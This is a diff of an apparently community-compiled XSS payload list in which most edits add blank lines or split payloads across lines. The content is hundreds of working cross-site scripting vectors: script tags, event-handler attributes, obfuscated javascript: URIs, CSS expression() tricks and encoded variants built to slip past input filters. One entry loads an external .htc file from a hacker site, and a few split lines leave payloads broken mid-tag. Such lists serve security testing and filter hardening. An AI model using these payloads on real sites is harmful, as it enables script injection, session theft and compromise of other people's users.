@@ -15,10 +15,16 @@ xss payloads
 
 &lt;STYLE&gt;.XSS{background-image:url("javascript:javascript:alert(1)");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
 
-&lt;HTML xmlns:xss&gt;&lt;?import namespace="xss" implementation="%(htc)s"&gt;&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;&lt;/HTML&gt;""","XML namespace."),("""&lt;XML ID="xss"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC="javas&lt;!-- --&gt;cript:javascript:alert(1)"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;&lt;SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"&gt;&lt;/SPAN&gt;
+&lt;HTML xmlns:xss&gt;&lt;?import namespace="xss" implementation="%(htc)s"&gt;&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;&lt;/HTML&gt;""","XML namespace."),("""&lt;XML ID="xss"&gt;&lt;
+
+I&gt;&lt;B&gt;&lt;IMG SRC="javas&lt;!-- --&gt;cript:javascript:alert(1)"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;&lt;SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"&gt;&lt;/SPAN&gt;
+
 &lt;HTML&gt;&lt;BODY&gt;&lt;?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"&gt;&lt;?import namespace="t" implementation="#default#time2"&gt;&lt;t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"&gt;&lt;/BODY&gt;&lt;/HTML&gt;
+
 '';!--"&lt;XSS&gt;=&{()}
+
 &lt;IMG SRC="javascript:alert('XSS');"&gt;
+
 &lt;IMG SRC=javascript:alert('XSS')&gt;
 
 &lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;
@@ -30,6 +36,7 @@ xss payloads
 &lt;IMG """&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt;
 
 &lt;IMG SRC="jav   ascript:alert('XSS');"&gt;
+
 &lt;IMG SRC="jav&#x09;ascript:alert('XSS');"&gt;
 
 &lt;IMG SRC="jav&#x0A;ascript:alert('XSS');"&gt;
@@ -132,6 +139,7 @@ exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'
 &lt;script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)&gt;&lt;/script
 
 &lt;IMG SRC=jAVasCrIPt:alert(‘XSS’)&gt;
+
 &lt;IMG SRC=”javascript:alert(‘XSS’);”&gt;
 
 &lt;IMG SRC=javascript:alert(&quot;XSS&quot;)&gt;
@@ -239,6 +247,7 @@ xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'&gt;
 d=\"alert('XSS');\\")\";
 
 &lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\"xss\" implementation=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\"&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;
+
 &lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\"javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('XSS');\"&gt;&#93;&#93;&gt;
 
 &lt;XML ID=\"xss\"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\"javas&lt;!-- --&gt;cript&#58;alert('XSS')\"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
@@ -397,6 +406,7 @@ alert;pg("XSS")
 
 
 &lt;STYLE&gt;li {list-style-image: url(\"javascript:alert('XSS')\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
+
 perl -e 'print \"&lt;SCR\0IPT&gt;alert(\"XSS\")&lt;/SCR\0IPT&gt;\";' &gt; out
 
 
@@ -791,6 +801,7 @@ perl -e &#039;print \";&lt;;SCR\0IPT&gt;;alert(\";XSS\";)&lt;;/SCR\0IPT&gt;;\";;
 &lt;script&gt;alert('XSS')&lt;/script&gt;
 
 %3cscript%3ealert('XSS')%3c/script%3e
+
 %22%3e%3cscript%3ealert('XSS')%3c/script%3e
 
 &lt;script\x3Etype="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
@@ -844,6 +855,7 @@ perl -e &#039;print \";&lt;;SCR\0IPT&gt;;alert(\";XSS\";)&lt;;/SCR\0IPT&gt;;\";;
 &lt;svg onLoad svg onLoad="javascript:javascript:alert(1)"&gt;&lt;/svg onLoad&gt;
 
 &lt;body onPageHide body onPageHide="javascript:javascript:alert(1)"&gt;&lt;/body onPageHide&gt;
+
 &lt;body onMouseOver body onMouseOver="javascript:javascript:alert(1)"&gt;&lt;/body onMouseOver&gt;
 
 &lt;body onUnload body onUnload="javascript:javascript:alert(1)"&gt;&lt;/body onUnload&gt;
@@ -879,6 +891,7 @@ perl -e &#039;print \";&lt;;SCR\0IPT&gt;;alert(\";XSS\";)&lt;;/SCR\0IPT&gt;;\";;
 &lt;body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"&gt;&lt;/body onBeforeUnload&gt;
 
 &lt;html onMouseDown html onMouseDown="javascript:javascript:alert(1)"&gt;&lt;/html onMouseDown&gt;
+
 &lt;marquee onScroll marquee onScroll="javascript:javascript:alert(1)"&gt;&lt;/marquee onScroll&gt;
 
 &lt;xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"&gt;&lt;/xml onPropertyChange&gt;
@@ -938,6 +951,7 @@ perl -e &#039;print \";&lt;;SCR\0IPT&gt;;alert(\";XSS\";)&lt;;/SCR\0IPT&gt;;\";;
 &lt;body onblur body onblur="javascript:javascript:alert(1)"&gt;&lt;/body onblur&gt;
 
 \x3Cscript&gt;javascript:alert(1)&lt;/script&gt;
+
 '"`&gt;&lt;script&gt;/* *\x2Fjavascript:alert(1)// */&lt;/script&gt;
 
 &lt;script&gt;javascript:alert(1)&lt;/script\x0D
@@ -972,6 +986,7 @@ perl -e &#039;print \";&lt;;SCR\0IPT&gt;;alert(\";XSS\";)&lt;;/SCR\0IPT&gt;;\";;
 
 
 &lt;a href="javas\x0Acript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
+
 &lt;a href="javas\x08cript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
 
 &lt;a href="javas\x02cript:javascript:alert(1)" id="fuzzelement1"&gt;test&lt;/a&gt;
@@ -1012,6 +1027,7 @@ perl -e &#039;print \";&lt;;SCR\0IPT&gt;;alert(\";XSS\";)&lt;;/SCR\0IPT&gt;;\";;
 "'`&gt;ABC&lt;div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"&gt;DEF
 
 &lt;script&gt;if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}&lt;/script&gt;
+
 &lt;script&gt;if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}&lt;/script&gt;
 
 &lt;script&gt;if("x\\xEE\xA9\x93".length==2) { javascript:alert(1);}&lt;/script&gt;
@@ -1360,7 +1376,9 @@ ABC&lt;div style="x:\xE2\x80\x89expression(javascript:alert(1)"&gt;DEF
 
 &lt;body oninput=javascript:alert(1)&gt;&lt;input autofocus&gt;
 
-&lt;math href="javascript:javascript:alert(1)"&gt;CLICKME&lt;/math&gt;  &lt;math&gt; &lt;maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)"&gt;CLICKME&lt;/maction&gt; &lt;/math&gt;
+&lt;math href="javascript:javascript:alert(1)"&gt;CLICKME&lt;/math&gt;  &lt;math&gt; &lt;maction actiontype="statusline#http://google.com" 
+
+xlink:href="javascript:javascript:alert(1)"&gt;CLICKME&lt;/maction&gt; &lt;/math&gt;
 
 &lt;frameset onload=javascript:alert(1)&gt;
 
@@ -1384,7 +1402,9 @@ ABC&lt;div style="x:\xE2\x80\x89expression(javascript:alert(1)"&gt;DEF
 
 &lt;b &lt;script&gt;alert(1)&lt;/script&gt;0
 
-&lt;div id="div1"&gt;&lt;input value="``onmouseover=javascript:alert(1)"&gt;&lt;/div&gt; &lt;div id="div2"&gt;&lt;/div&gt;&lt;script&gt;document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;&lt;/script&gt;
+&lt;div id="div1"&gt;&lt;input value="``onmouseover=javascript:alert(1)"&gt;&lt;/div&gt; &lt;div id="div2"&gt;&lt;/div&gt;&lt;script&gt;
+
+document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;&lt;/script&gt;
 
 &lt;x '="foo"&gt;&lt;x foo='&gt;&lt;img src=x onerror=javascript:alert(1)//'&gt;
 
@@ -1500,7 +1520,9 @@ ABC&lt;div style="x:\xE2\x80\x89expression(javascript:alert(1)"&gt;DEF
 
 &lt;style&gt;@import "data:,*%7bx:expression(javascript:alert(1))%7D";&lt;/style&gt;
 
-&lt;a style="pointer-events:none;position:absolute;"&gt;&lt;a style="position:absolute;" onclick="javascript:alert(1);"&gt;XXX&lt;/a&gt;&lt;/a&gt;&lt;a href="javascript:javascript:alert(1)"&gt;XXX&lt;/a&gt;
+&lt;a style="pointer-events:none;position:absolute;"&gt;&lt;a style="position:absolute;" onclick="javascript:alert(1);"&gt;XXX&lt;/a&gt;&lt;/a&gt;&lt;a 
+
+href="javascript:javascript:alert(1)"&gt;XXX&lt;/a&gt;
 
 &lt;// style=x:expression\28javascript:alert(1)\29&gt;
 
@@ -1513,7 +1535,9 @@ ABC&lt;div style="x:\xE2\x80\x89expression(javascript:alert(1)"&gt;DEF
 &lt;script&gt;({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval&lt;/script&gt;
 
 &lt;script&gt;({0:#0=eval/#0#/#0#(javascript:alert(1))})&lt;/script&gt;
+
 &lt;script&gt;ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x&lt;/script&gt;
+
 
 
 &lt;script&gt;Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()&lt;/script&gt;
@@ -1769,6 +1793,7 @@ http://www.&lt;script&gt;alert(1)&lt;/script .com
 &lt;form&gt;&lt;button formaction=javascript&colon;alert(1)&gt;CLICKME
 
 ‘; alert(1);
+
 ‘)alert(1);//
 
 &lt;ScRiPt&gt;alert(1)&lt;/sCriPt&gt;
